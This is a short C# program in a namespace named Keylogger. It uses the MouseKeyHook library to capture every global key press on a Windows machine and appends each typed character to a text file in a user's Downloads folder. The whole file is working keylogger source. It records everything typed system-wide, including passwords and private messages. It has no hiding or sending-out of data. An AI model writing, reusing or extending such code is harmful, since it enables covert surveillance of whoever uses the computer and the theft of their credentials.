using Gma.System.MouseKeyHook;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace Keylogger 
{
    class Program
    {
        static void Main(string[] args)
        {
            var hook = Hook.GlobalEvents();
            hook.KeyPress += Hook_KeyPress;
            Application.Run();
        }
        private static void Hook_KeyPress(object sender, System.Windows.Forms.KeyPressEventArgs e) {
            Log("Press: '" + e.KeyChar + "'");
        }
        private static void Log(string log) {
            File.AppendAllText("C:/Users/Iiro.Polso/Downloads/Documents/logs.txt", log);
        }
    }
}